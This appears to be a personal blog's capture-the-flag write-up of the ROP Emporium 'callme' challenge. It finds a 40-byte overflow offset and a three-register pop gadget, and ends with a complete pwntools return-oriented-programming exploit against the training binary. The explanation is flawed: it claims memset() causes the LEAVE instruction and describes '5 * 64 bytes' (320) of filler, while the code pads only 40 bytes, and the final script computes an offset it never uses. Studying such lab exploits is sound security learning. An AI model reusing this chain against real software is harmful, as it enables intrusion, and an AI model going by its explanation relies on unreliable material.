---
layout: post
title: ropemporium - callme
date: 2024-12-24 11:00:00 +0300
description: # Add post description (optional)
img: callme-1.png # (optional)
fig-caption: # Add figcaption (optional)
tags: ctf
---


*Third challenge from ropemporium. A challenge that at first glance looked pretty easy, it ended up being a mind breaking challenge where I learned how the PLT and GOT sections works expecting that this knowledge would help me in the resolution, just to discover that I just had to understand how the C function "**memset()**" works and its consequences by the "**LEAVE**" instruction at the end of it.*

The challenge give us the following guide:

> *You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) The solution here is simple enough, use your knowledge about what resides in the PLT to call the callme_ functions in the above order and with the correct arguments. (...)*

First checking the file protections, we can notice the following protections:
- NX (Non executable stack)

![callme]({{site.baseurl}}/assets/img/callme-1.png)

Also checking for the imported functions inside the file:

![callme]({{site.baseurl}}/assets/img/callme-2.png)

And now the symbols useful for us:

![callme]({{site.baseurl}}/assets/img/callme-3.png)

From here we can assume 3 things:
- We have an "usefulFunction" we still don't know what it does;
- The "pwnme" function is (probably) the exploitable function;
- the callme_'s  are being imported.

Sending a pattern for the file to discover the offset we need to fill the buffer, we discovered that the offset is 40 bytes, which means that 40 bytes are needed to fill the buffer, and then we can set RIP to redirect the program execution.

![callme]({{site.baseurl}}/assets/img/callme-4.png)

We know by the challenge text that we need to call a function with 3 parameters, so we already know we will need gadgets to perform that action.

Searching for gadgets to *pop rdx*, we found a very handy one:

![callme]({{site.baseurl}}/assets/img/callme-5.png)

```
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
```

That gadget does exactly the process of popping 3 times to the exact calling convention order.

I started to build the payload with the following logic:
```
BUFFER FILLER (40 Bytes)
+ *POP PARAMETERS GADGET
+ PARAMETERS (P1+P2+P3) ARRAY
+ CALLME_ONE
+ *POP PARAMETERS GADGET
+ PARAMETERS (P1+P2+P3) ARRAY
+ CALLME_TWO
+ *POP PARAMETERS GADGET
+ PARAMETERS (P1+P2+P3) ARRAY
+ CALLME_THREE
```

Unfortunately, for some reason I was getting a crash on "**callme_two**" and I didn't know why, and some things I've analyzed:
- If it was for the parameters, It would return "Incorrect parameters", and it wasn't the case.
- If it was the function addresses, it shouldn't fail at some of them.
- I learned how the *.plt* and *.got* section would affect the process, how those sections work and how all the dynamic linking process and runtime name resolution works instruction by instruction.

None of the answers helped me unless to acquire more knowledge.

But then I looked closer.

A very interesting point at the code instructions, is that in the very end of "**pwnme**"  function, we have a *LEAVE* instruction, caused by the *memset()* function in *C* found in reversing.

![callme]({{site.baseurl}}/assets/img/callme-6.png)

What this instruction does, basically "*sets the stack pointer to the base frame address, effectively releasing the whole frame. If you didn't do it, once you call `ret`, you would still be using the called function's stack frame with your calling function, with crashtastic consequences.*" as wisely said on [this thread](https://stackoverflow.com/questions/5474355/why-does-leave-do-mov-esp-ebp-in-x86-assembly). 

That was causing this part of the payload to be trimmed, and just call the "callme_two" first:
```
+ *POP PARAMETERS GADGET
+ PARAMETERS (P1+P2+P3) ARRAY
+ CALLME_ONE
```

The error caused is because the program ensures that you call all the functions in properly.

So I just had to fill 5 stack positions (5 * 64 bytes) with dummies to avoid the payload corruption.

With that in mind, before the *RET* instruction, we have to fill the whole buffer part that will be released, so when the return address is met, the payload isn't trimmed.

Knowing that, we could start forging our payload with the following logic:
```
BUFFER FILLER (40 Bytes)
+ 320 BYTE MEMSET FILLER TO GO AWAY WITH "LEAVE" INSTRUCTION
+ *POP PARAMETERS GADGET
+ PARAMETERS (P1+P2+P3) ARRAY
+ CALLME_ONE
+ *POP PARAMETERS GADGET
+ PARAMETERS (P1+P2+P3) ARRAY
+ CALLME_TWO
+ *POP PARAMETERS GADGET
+ PARAMETERS (P1+P2+P3) ARRAY
+ CALLME_THREE
```

Putting all together, and executing the code, we got the flag!

![callme]({{site.baseurl}}/assets/img/callme-7.png)

Final exploit:
{% highlight python %}
from pwn import *

FIRST_PARAM = p64(0xdeadbeefdeadbeef)
SEC_PARAM = p64(0xcafebabecafebabe)
THIRD_PARAM = p64(0xd00df00dd00df00d)

# 8 + 32 byte filler to fill the memset frame
MEMSET_FILLER = p64(0xdeadbeefdeadbeef)*5 

PARAM_ARRAY = FIRST_PARAM+SEC_PARAM+THIRD_PARAM

CALLME_ONE = p64(0x400720)
CALLME_TWO = p64(0x400740)
CALLME_THREE = p64(0x4006f0)

# pop rdi ; pop rsi ; pop rdx ; ret
POP_PARAMS_GADGET = p64(0x40093c) 

DUMMY = p64(0x0)

elf = context.binary = ELF('./callme')

io = process(elf.path)
io.send(cyclic(50))
io.wait()

core = io.corefile
stack = core.rsp
pattern = core.read(stack, 8)

rop_chain = MEMSET_FILLER 
rop_chain += POP_PARAMS_GADGET 
rop_chain += PARAM_ARRAY 
rop_chain += CALLME_ONE 
rop_chain += POP_PARAMS_GADGET 
rop_chain += PARAM_ARRAY 
rop_chain += CALLME_TWO 
rop_chain += POP_PARAMS_GADGET 
rop_chain += PARAM_ARRAY 
rop_chain += CALLME_THREE

info("Sending payload:")
info("%r", rop_chain)

payload = flat({pattern: rop_chain})

io = process(elf.path)

io.send(rop_chain)
io.interactive()
{% endhighlight %}